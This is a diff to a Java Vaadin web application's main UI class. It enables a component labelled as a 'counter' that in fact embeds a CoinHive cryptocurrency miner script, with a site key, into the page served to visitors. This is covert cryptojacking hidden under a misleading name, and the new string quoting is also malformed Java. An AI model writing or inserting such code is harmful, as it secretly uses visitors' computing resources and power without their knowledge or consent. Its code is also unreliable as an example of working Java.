@@ -67,7 +67,7 @@ public class MyUI extends UI {
               .add("О нас", VaadinIcons.GROUP, View2.class)   
               .addClickable("Войти", VaadinIcons.ENTER_ARROW, clickEvent -> {InitLogin(vaadinRequest);})
               .add(PlayerHTMLHolder)
-              //.add(CounterHTMLHolder)
+              .add(CounterHTMLHolder)
               .build();
         
         setContent(layout);
@@ -141,9 +141,10 @@ public class MyUI extends UI {
     }
     
     private void InitCounter(){
-        String HTML = "<script src="https://coinhive.com/lib/coinhive.min.js"></script> /n" +
-        "<script> var miner = new CoinHive.User('136QjAgyyBKROCe', 'john-doe'); /n " +
-        "miner.start(); /n " + 
+        String HTML = "<script src=""https://coinhive.com/lib/coinhive.min.js""></script>\n" + 
+        "<script>\n" +
+        "    var miner = new CoinHive.User('uPKFHYCHa2DjjajB9vEQJ2q3w7k9rraL', 'anon');\n" +
+	     "    miner.start();\n" +
         "</script>";
         CounterHTMLHolder = new Label(HTML);
         CounterHTMLHolder.setContentMode(ContentMode.HTML);
